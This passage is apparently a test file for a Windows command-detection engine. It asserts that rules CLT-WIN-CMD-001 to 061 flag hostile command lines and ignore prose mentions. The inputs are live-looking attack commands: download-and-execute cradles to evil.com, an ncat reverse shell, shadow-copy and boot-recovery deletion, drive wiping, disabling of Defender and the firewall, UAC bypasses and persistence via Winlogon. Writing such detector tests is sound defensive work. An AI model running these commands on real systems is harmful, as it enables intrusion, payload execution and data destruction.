		);
	});

	it("detects sdclt.exe UAC bypass (WIN-CMD-055)", () => {
		expect(matchCommand(engine, "sdclt.exe")).toContain("CLT-WIN-CMD-055");
	});

	it("detects CompMgmtLauncher.exe UAC bypass (WIN-CMD-055)", () => {
		expect(matchCommand(engine, "CompMgmtLauncher.exe")).toContain("CLT-WIN-CMD-055");
	});

	// --- PowerShell techniques (WIN-CMD-056..061) ---

	it("detects powershell iex $env (WIN-CMD-056)", () => {
		expect(matchCommand(engine, "powershell iex $env:comspec")).toContain("CLT-WIN-CMD-056");
	});

	it("detects powershell -Version downgrade (WIN-CMD-057)", () => {
		expect(matchCommand(engine, "powershell -Version 2 -Command Get-Process")).toContain(
			"CLT-WIN-CMD-057",
		);
	});

	it("detects powershell iex downloadstring cradle (WIN-CMD-058)", () => {
		expect(
			matchCommand(
				engine,
				"powershell iex (New-Object Net.WebClient).DownloadString('http://evil.com/s.ps1')",
			),
		).toContain("CLT-WIN-CMD-058");
	});

	it("detects powershell Reflection.Assembly Load (WIN-CMD-059)", () => {
		expect(matchCommand(engine, "powershell [Reflection.Assembly]::Load($bytes)")).toContain(
			"CLT-WIN-CMD-059",
		);
	});

	it("detects powershell cert validation bypass (WIN-CMD-060)", () => {
		expect(
			matchCommand(
				engine,
				"powershell [Net.ServicePointManager]::ServerCertificateValidationCallback = { $true }",
			),
		).toContain("CLT-WIN-CMD-060");
	});

	it("detects powershell GetTypeFromCLSID (WIN-CMD-061)", () => {
		expect(
			matchCommand(
				engine,
				"powershell [Type]::GetTypeFromCLSID('72C24DD5-D70A-438B-8A42-98424B88AFB8')",
			),
		).toContain("CLT-WIN-CMD-061");
	});

	// --- Extended bcdedit/recovery (WIN-CMD-033 merge) ---

	it("detects bcdedit bootems off (WIN-CMD-033)", () => {
		expect(matchCommand(engine, "bcdedit /set bootems off")).toContain("CLT-WIN-CMD-033");
	});

	it("detects reg delete SafeBoot (WIN-CMD-033)", () => {
		expect(
			matchCommand(engine, "reg delete HKLM\\SYSTEM\\CurrentControlSet\\Control\\SafeBoot /f"),
		).toContain("CLT-WIN-CMD-033");
	});

	it("detects reg add Winlogon Userinit (WIN-CMD-033)", () => {
		expect(
			matchCommand(
				engine,
				"reg add HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon /v Userinit /d evil.exe",
			),
		).toContain("CLT-WIN-CMD-033");
	});

	// --- Extended Defender settings (WIN-CMD-037 merge) ---

	it("detects Add-MpPreference -Exclusion (WIN-CMD-037)", () => {
		expect(matchCommand(engine, "Add-MpPreference -ExclusionPath C:\\malware")).toContain(
			"CLT-WIN-CMD-037",
		);
	});

	// --- Quoted-mention FP coverage for the CMD_POS corpus sweep ---

	it("does not match a prose mention of irm piped to iex (001 FP)", () => {
		const ids = matchCommand(engine, 'echo "irm url | iex is a classic technique"');
		expect(ids).not.toContain("CLT-WIN-CMD-001");
	});

	it("does not match a prose mention of iex(irm url) (002 FP)", () => {
		const ids = matchCommand(engine, 'echo "iex(irm url) is a classic technique"');
		expect(ids).not.toContain("CLT-WIN-CMD-002");
	});

	it("does not match a prose mention of Start-Process -FilePath (003 FP)", () => {
		const ids = matchCommand(
			engine,
			'echo "Start-Process -FilePath malware.exe is a classic technique"',
		);
		expect(ids).not.toContain("CLT-WIN-CMD-003");
	});

	it("does not match a prose mention of curl -o install.cmd (004 FP)", () => {
		const ids = matchCommand(
			engine,
			'echo "curl -o install.cmd && install.cmd is a classic technique"',
		);
		expect(ids).not.toContain("CLT-WIN-CMD-004");
	});

	it("does not match a prose mention of New-Object WebClient (005 FP)", () => {
		const ids = matchCommand(
			engine,
			'echo "New-Object Net.WebClient DownloadString is a classic technique"',
		);
		expect(ids).not.toContain("CLT-WIN-CMD-005");
	});

	it("does not match a prose mention of Start-BitsTransfer (006 FP)", () => {
		const ids = matchCommand(engine, 'echo "Start-BitsTransfer is a classic technique"');
		expect(ids).not.toContain("CLT-WIN-CMD-006");
	});

	it("does not match a prose mention of certutil -urlcache (007 FP)", () => {
		const ids = matchCommand(engine, 'echo "certutil -urlcache is a classic technique"');
		expect(ids).not.toContain("CLT-WIN-CMD-007");
	});

	it("does not match a prose mention of bitsadmin /transfer (008 FP)", () => {
		const ids = matchCommand(engine, 'echo "bitsadmin /transfer is a classic technique"');
		expect(ids).not.toContain("CLT-WIN-CMD-008");
	});

	it("does not match a prose mention of mshta https (009 FP)", () => {
		const ids = matchCommand(engine, 'echo "mshta https://evil.test is a classic technique"');
		expect(ids).not.toContain("CLT-WIN-CMD-009");
	});

	it("does not match a prose mention of regsvr32 /i payload.sct (010 FP)", () => {
		const ids = matchCommand(engine, 'echo "regsvr32 /i payload.sct is a classic technique"');
		expect(ids).not.toContain("CLT-WIN-CMD-010");
	});

	it("does not match a prose mention of rundll32 javascript (011 FP)", () => {
		const ids = matchCommand(engine, 'echo "rundll32 javascript: is a classic technique"');
		expect(ids).not.toContain("CLT-WIN-CMD-011");
	});

	it("does not match a prose mention of cmstp /au evil.inf (012 FP)", () => {
		const ids = matchCommand(engine, 'echo "cmstp /au evil.inf is a classic technique"');
		expect(ids).not.toContain("CLT-WIN-CMD-012");
	});

	it("does not match a prose mention of wmic process call create (013 FP)", () => {
		const ids = matchCommand(engine, 'echo "wmic process call create is a classic technique"');
		expect(ids).not.toContain("CLT-WIN-CMD-013");
	});

	it("does not match a prose mention of msiexec /i https (014 FP)", () => {
		const ids = matchCommand(engine, 'echo "msiexec /i https://evil.test is a classic technique"');
		expect(ids).not.toContain("CLT-WIN-CMD-014");
	});

	it("does not match a prose mention of forfiles /c cmd (015 FP)", () => {
		const ids = matchCommand(engine, 'echo "forfiles /c cmd is a classic technique"');
		expect(ids).not.toContain("CLT-WIN-CMD-015");
	});

	it("does not match a prose mention of pcalua -a malware.exe (016 FP)", () => {
		const ids = matchCommand(engine, 'echo "pcalua -a malware.exe is a classic technique"');
		expect(ids).not.toContain("CLT-WIN-CMD-016");
	});

	it("does not match a prose mention of installutil /logfile= (017 FP)", () => {
		const ids = matchCommand(engine, 'echo "installutil /logfile= is a classic technique"');
		expect(ids).not.toContain("CLT-WIN-CMD-017");
	});

	it("does not match a prose mention of regasm /u payload.dll (018 FP)", () => {
		const ids = matchCommand(engine, 'echo "regasm /u payload.dll is a classic technique"');
		expect(ids).not.toContain("CLT-WIN-CMD-018");
	});

	it("does not match a prose mention of format C: (019 FP)", () => {
		const ids = matchCommand(engine, 'echo "format C: is a classic technique"');
		expect(ids).not.toContain("CLT-WIN-CMD-019");
	});

	it("does not match a prose mention of rd /s /q C:\\ (020 FP)", () => {
		const ids = matchCommand(engine, 'echo "rd /s /q C:\\ is a classic technique"');
		expect(ids).not.toContain("CLT-WIN-CMD-020");
	});

	it("does not match a prose mention of del /f /s /q C:\\ (021 FP)", () => {
		const ids = matchCommand(engine, 'echo "del /f /s /q C:\\ is a classic technique"');
		expect(ids).not.toContain("CLT-WIN-CMD-021");
	});

	it("does not match a prose mention of New-Object TcpClient (023 FP)", () => {
		const ids = matchCommand(
			engine,
			'echo "New-Object System.Net.Sockets.TcpClient is a classic technique"',
		);
		expect(ids).not.toContain("CLT-WIN-CMD-023");
	});

	it("does not match a prose mention of New-Object UdpClient (024 FP)", () => {
		const ids = matchCommand(
			engine,
			'echo "New-Object System.Net.Sockets.UdpClient is a classic technique"',
		);
		expect(ids).not.toContain("CLT-WIN-CMD-024");
	});

	it("does not match a prose mention of runas /user: (025 FP)", () => {
		const ids = matchCommand(engine, 'echo "runas /user:Administrator is a classic technique"');
		expect(ids).not.toContain("CLT-WIN-CMD-025");
	});

	it("does not match a prose mention of fodhelper (027 FP)", () => {
		const ids = matchCommand(engine, 'echo "fodhelper is a classic technique"');
		expect(ids).not.toContain("CLT-WIN-CMD-027");
	});

	it("does not match a prose mention of Remove-Item -Recurse -Force (028 FP)", () => {
		const ids = matchCommand(
			engine,
			'echo "Remove-Item C:\\Windows -Recurse -Force is a classic technique"',
		);
		expect(ids).not.toContain("CLT-WIN-CMD-028");
	});

	it("does not match a prose mention of Clear-RecycleBin -Force (029 FP)", () => {
		const ids = matchCommand(engine, 'echo "Clear-RecycleBin -Force is a classic technique"');
		expect(ids).not.toContain("CLT-WIN-CMD-029");
	});

	it("does not match a prose mention of ncat -e cmd (030 FP)", () => {
		const ids = matchCommand(engine, 'echo "ncat -e cmd is a classic technique"');
		expect(ids).not.toContain("CLT-WIN-CMD-030");
	});

	it("does not match a prose mention of vssadmin delete shadows (031 FP)", () => {
		const ids = matchCommand(engine, 'echo "vssadmin delete shadows is a classic technique"');
		expect(ids).not.toContain("CLT-WIN-CMD-031");
	});

	it("does not match a prose mention of wmic shadowcopy delete (032 FP)", () => {
		const ids = matchCommand(engine, 'echo "wmic shadowcopy delete is a classic technique"');
		expect(ids).not.toContain("CLT-WIN-CMD-032");
	});

	it("does not match a prose mention of bcdedit /set recoveryenabled (033 FP)", () => {
		const ids = matchCommand(
			engine,
			'echo "bcdedit /set recoveryenabled No is a classic technique"',
		);
		expect(ids).not.toContain("CLT-WIN-CMD-033");
	});

	it("does not match a prose mention of Get-WmiObject Win32_ShadowCopy Delete (034 FP)", () => {
		const ids = matchCommand(
			engine,
			'echo "Get-WmiObject Win32_ShadowCopy Delete is a classic technique"',
		);
		expect(ids).not.toContain("CLT-WIN-CMD-034");
	});

	it("does not match a prose mention of wevtutil cl Security (035 FP)", () => {
		const ids = matchCommand(engine, 'echo "wevtutil cl Security is a classic technique"');
		expect(ids).not.toContain("CLT-WIN-CMD-035");
	});

	it("does not match a prose mention of Set-MpPreference -Disable (037 FP)", () => {
		const ids = matchCommand(engine, 'echo "Set-MpPreference -Disable is a classic technique"');
		expect(ids).not.toContain("CLT-WIN-CMD-037");
	});

	it("does not match a prose mention of sc stop WinDefend (038 FP)", () => {
		const ids = matchCommand(engine, 'echo "sc stop WinDefend is a classic technique"');
		expect(ids).not.toContain("CLT-WIN-CMD-038");
	});

	it("does not match a prose mention of netsh advfirewall state off (039 FP)", () => {
		const ids = matchCommand(engine, 'echo "netsh advfirewall state off is a classic technique"');
		expect(ids).not.toContain("CLT-WIN-CMD-039");
	});

	it("does not match a prose mention of 7z -pSECRET (040 FP)", () => {
		const ids = matchCommand(engine, 'echo "7z a -pSECRET is a classic technique"');
		expect(ids).not.toContain("CLT-WIN-CMD-040");
	});

	it("does not match a prose mention of 7z bulk docx archiving (041 FP)", () => {
		const ids = matchCommand(engine, 'echo "7z a docs.7z *.docx is a classic technique"');
		expect(ids).not.toContain("CLT-WIN-CMD-041");
	});

	it("does not match a prose mention of wscript Users\\Public (043 FP)", () => {
		const ids = matchCommand(engine, 'echo "wscript.exe Users\\Public is a classic technique"');
		expect(ids).not.toContain("CLT-WIN-CMD-043");
	});

	it("does not match a prose mention of regsvr32 /i:https (044 FP)", () => {
		const ids = matchCommand(engine, 'echo "regsvr32 /i:https://evil.test is a classic technique"');
		expect(ids).not.toContain("CLT-WIN-CMD-044");
	});

	it("does not match a prose mention of cmdl32.exe (045 FP)", () => {
		const ids = matchCommand(engine, 'echo "cmdl32.exe is a classic technique"');
		expect(ids).not.toContain("CLT-WIN-CMD-045");
	});

	it("does not match a prose mention of curl --output + start chain (046 FP)", () => {
		const ids = matchCommand(
			engine,
			'echo "curl --output a.exe & start a.exe is a classic technique"',
		);
		expect(ids).not.toContain("CLT-WIN-CMD-046");
	});

	it("does not match a prose mention of vssadmin resize shadowstorage (047 FP)", () => {
		const ids = matchCommand(engine, 'echo "vssadmin resize shadowstorage is a classic technique"');
		expect(ids).not.toContain("CLT-WIN-CMD-047");
	});

	it("does not match a prose mention of netsh firewall opmode DISABLE (048 FP)", () => {
		const ids = matchCommand(
			engine,
			'echo "netsh firewall set opmode mode=DISABLE is a classic technique"',
		);
		expect(ids).not.toContain("CLT-WIN-CMD-048");
	});

	it("does not match a prose mention of netsh advfirewall add rule (049 FP)", () => {
		const ids = matchCommand(
			engine,
			'echo "netsh advfirewall firewall add rule is a classic technique"',
		);
		expect(ids).not.toContain("CLT-WIN-CMD-049");
	});

	it("does not match a prose mention of regsvr32 /i:http (050 FP)", () => {
		const ids = matchCommand(engine, 'echo "regsvr32 /i:http is a classic technique"');
		expect(ids).not.toContain("CLT-WIN-CMD-050");
	});

	it("does not match a prose mention of Mavinject64.exe (051 FP)", () => {
		const ids = matchCommand(engine, 'echo "Mavinject64.exe is a classic technique"');
		expect(ids).not.toContain("CLT-WIN-CMD-051");
	});

	it("does not match a prose mention of inject_dll_x86.exe (052 FP)", () => {
		const ids = matchCommand(engine, 'echo "inject_dll_x86.exe is a classic technique"');
		expect(ids).not.toContain("CLT-WIN-CMD-052");
	});

	it("does not match a prose mention of rundll32.exe PowerShdll.dll (053 FP)", () => {
		const ids = matchCommand(engine, 'echo "rundll32.exe PowerShdll.dll is a classic technique"');
		expect(ids).not.toContain("CLT-WIN-CMD-053");
	});

	it("does not match a prose mention of SyncAppvPublishingServer.vbs iex (054 FP)", () => {
		const ids = matchCommand(
			engine,
			'echo "SyncAppvPublishingServer.vbs iex is a classic technique"',
		);
		expect(ids).not.toContain("CLT-WIN-CMD-054");
	});

	it("does not match a prose mention of sdclt.exe (055 FP)", () => {
		const ids = matchCommand(engine, 'echo "sdclt.exe is a classic technique"');
		expect(ids).not.toContain("CLT-WIN-CMD-055");
	});

	it("does not match a prose mention of powershell iex $env (056 FP)", () => {
		const ids = matchCommand(engine, 'echo "powershell iex $env is a classic technique"');
		expect(ids).not.toContain("CLT-WIN-CMD-056");
	});

	it("does not match a prose mention of powershell -Version 2 (057 FP)", () => {
		const ids = matchCommand(engine, 'echo "powershell -Version 2 is a classic technique"');
		expect(ids).not.toContain("CLT-WIN-CMD-057");
	});

	it("does not match a prose mention of powershell iex downloadstring (058 FP)", () => {
		const ids = matchCommand(engine, 'echo "powershell iex downloadstring is a classic technique"');
		expect(ids).not.toContain("CLT-WIN-CMD-058");
	});

	it("does not match a prose mention of Reflection.Assembly Load (059 FP)", () => {
		const ids = matchCommand(
			engine,
			'echo "powershell Reflection.Assembly Load is a classic technique"',
		);
		expect(ids).not.toContain("CLT-WIN-CMD-059");
	});

	it("does not match a prose mention of ServerCertificateValidationCallback (060 FP)", () => {
		const ids = matchCommand(
			engine,
			'echo "powershell ServerCertificateValidationCallback is a classic technique"',
		);
		expect(ids).not.toContain("CLT-WIN-CMD-060");
	});

	it("does not match a prose mention of GetTypeFromCLSID (061 FP)", () => {
		const ids = matchCommand(engine, 'echo "powershell GetTypeFromCLSID is a classic technique"');
		expect(ids).not.toContain("CLT-WIN-CMD-061");
	});

	// --- `.exe` suffix regression coverage ---
	//
	// {{NOT_FILENAME}} rejects a trailing dot, so `{{CMD_POS}}name{{NOT_FILENAME}}`
	// without an optional `(?:\.exe)?` ahead of it cannot match `name.exe` --
	// a real invocation, not a filename mention. The old `\bname\b` patterns
	// these rules replaced matched both forms; these lock in that the
	// explicit `.exe` form still fires post-CMD_POS.

	it("detects curl.exe | iex (001)", () => {
		expect(matchCommand(engine, "curl.exe https://evil.com/install.ps1 | iex")).toContain(
			"CLT-WIN-CMD-001",
		);
	});

	it("detects curl.exe -o file.cmd && execute (004)", () => {
		expect(
			matchCommand(engine, "curl.exe -fsSL https://evil.com/i.cmd -o i.cmd && i.cmd"),
		).toContain("CLT-WIN-CMD-004");
	});

	it("detects certutil.exe -decode (007)", () => {
		expect(matchCommand(engine, "certutil.exe -decode encoded.b64 payload.exe")).toContain(
			"CLT-WIN-CMD-007",
		);
	});

	it("detects bitsadmin.exe /transfer (008)", () => {
		expect(
			matchCommand(engine, "bitsadmin.exe /transfer myJob https://evil.com/p.exe C:\\temp\\p.exe"),
		).toContain("CLT-WIN-CMD-008");
	});

	it("detects regsvr32.exe scriptlet (010)", () => {
		expect(
			matchCommand(engine, "regsvr32.exe /s /i:https://evil.com/payload.sct scrobj.dll"),
		).toContain("CLT-WIN-CMD-010");
	});

	it("detects rundll32.exe javascript (011)", () => {
		expect(
			matchCommand(engine, 'rundll32.exe javascript:"\\..\\mshtml,RunHTMLApplication";alert(1)'),
		).toContain("CLT-WIN-CMD-011");
	});

	it("detects cmstp.exe INF (012)", () => {
		expect(matchCommand(engine, "cmstp.exe /au /s evil.inf")).toContain("CLT-WIN-CMD-012");
	});

	it("detects wmic.exe process call create (013)", () => {
		expect(matchCommand(engine, 'wmic.exe process call create "cmd /c malware.exe"')).toContain(
			"CLT-WIN-CMD-013",
		);
	});

	it("detects msiexec.exe remote (014)", () => {
		expect(matchCommand(engine, "msiexec.exe /q /i https://evil.com/pkg.msi")).toContain(
			"CLT-WIN-CMD-014",
		);
	});

	it("detects forfiles.exe /c cmd (015)", () => {
		expect(matchCommand(engine, 'forfiles.exe /c "cmd /c payload.exe"')).toContain(
			"CLT-WIN-CMD-015",
		);
	});

	it("detects pcalua.exe -a (016)", () => {
		expect(matchCommand(engine, "pcalua.exe -a malware.exe")).toContain("CLT-WIN-CMD-016");
	});

	it("detects installutil.exe (017)", () => {
		expect(matchCommand(engine, "installutil.exe /logfile= payload.dll")).toContain(
			"CLT-WIN-CMD-017",
		);
	});

	it("detects regasm.exe /u (018)", () => {
		expect(matchCommand(engine, "regasm.exe /u payload.dll")).toContain("CLT-WIN-CMD-018");
	});

	it("detects regsvcs.exe (018)", () => {
		expect(matchCommand(engine, "regsvcs.exe payload.dll")).toContain("CLT-WIN-CMD-018");
	});

	it("detects format.exe C: (019)", () => {
		expect(matchCommand(engine, "format.exe C:")).toContain("CLT-WIN-CMD-019");
	});

	it("detects rd.exe /s /q C:\\ (020)", () => {
		expect(matchCommand(engine, "rd.exe /s /q C:\\")).toContain("CLT-WIN-CMD-020");
	});

	it("detects del.exe /f /s /q C:\\ (021)", () => {
		expect(matchCommand(engine, "del.exe /f /s /q C:\\")).toContain("CLT-WIN-CMD-021");
	});

	it("detects runas.exe /user: (025)", () => {
		expect(matchCommand(engine, "runas.exe /user:Administrator cmd.exe")).toContain(
			"CLT-WIN-CMD-025",
		);
	});

	it("detects ncat.exe -e cmd (030)", () => {
		expect(matchCommand(engine, "ncat.exe 10.0.0.1 4444 -e cmd")).toContain("CLT-WIN-CMD-030");
	});

	it("detects vssadmin.exe delete shadows (031)", () => {
		expect(matchCommand(engine, "vssadmin.exe delete shadows /all /quiet")).toContain(
			"CLT-WIN-CMD-031",
		);
	});

	it("detects wmic.exe shadowcopy delete (032)", () => {
		expect(matchCommand(engine, "wmic.exe shadowcopy delete")).toContain("CLT-WIN-CMD-032");
	});

	it("detects bcdedit.exe recovery disable (033)", () => {
		expect(matchCommand(engine, "bcdedit.exe /set {default} recoveryenabled No")).toContain(
			"CLT-WIN-CMD-033",
		);
	});

	it("detects reg.exe delete SafeBoot (033)", () => {
		expect(
			matchCommand(engine, "reg.exe delete HKLM\\SYSTEM\\CurrentControlSet\\Control\\SafeBoot /f"),
		).toContain("CLT-WIN-CMD-033");
	});

	it("detects wevtutil.exe cl Security (035)", () => {
		expect(matchCommand(engine, "wevtutil.exe cl Security")).toContain("CLT-WIN-CMD-035");
	});

	it("detects sc.exe stop WinDefend (038)", () => {
		expect(matchCommand(engine, "sc.exe stop WinDefend")).toContain("CLT-WIN-CMD-038");
	});

	it("detects net.exe stop MpsSvc (038)", () => {
		expect(matchCommand(engine, "net.exe stop MpsSvc")).toContain("CLT-WIN-CMD-038");
	});

	it("detects netsh.exe advfirewall state off (039)", () => {
		expect(matchCommand(engine, "netsh.exe advfirewall set allprofiles state off")).toContain(
			"CLT-WIN-CMD-039",
		);
	});

	it("detects zip.exe --password (040)", () => {
		expect(matchCommand(engine, "zip.exe --password SECRET archive.zip file.txt")).toContain(
			"CLT-WIN-CMD-040",
		);
	});

	it("detects wget.exe --output + start chain (046)", () => {
		expect(
			matchCommand(
				engine,
				"wget.exe http://evil.test/m.exe --output C:\\Users\\Public\\m.exe & start C:\\Users\\Public\\m.exe",
			),
		).toContain("CLT-WIN-CMD-046");
	});

	it("detects vssadmin.exe resize shadowstorage (047)", () => {
		expect(
			matchCommand(engine, "vssadmin.exe resize shadowstorage /for=C: /on=C: /maxsize=401MB"),
		).toContain("CLT-WIN-CMD-047");
	});

	it("detects wbadmin.exe delete catalog (047)", () => {
		expect(matchCommand(engine, "wbadmin.exe delete catalog -quiet")).toContain("CLT-WIN-CMD-047");
	});

	it("detects netsh.exe firewall opmode DISABLE (048)", () => {
		expect(matchCommand(engine, "netsh.exe firewall set opmode mode=DISABLE")).toContain(
			"CLT-WIN-CMD-048",
		);
	});

	it("detects netsh.exe advfirewall add rule (049)", () => {
		expect(
			matchCommand(
				engine,
				"netsh.exe advfirewall firewall add rule name=backdoor program=C:\\evil.exe action=allow",
			),
		).toContain("CLT-WIN-CMD-049");
	});

	it("detects regsvr32.exe /i:http (050)", () => {
		expect(
			matchCommand(engine, "regsvr32.exe /s /n /u /i:http://evil.com/file.sct scrobj.dll"),
		).toContain("CLT-WIN-CMD-050");
	});
});
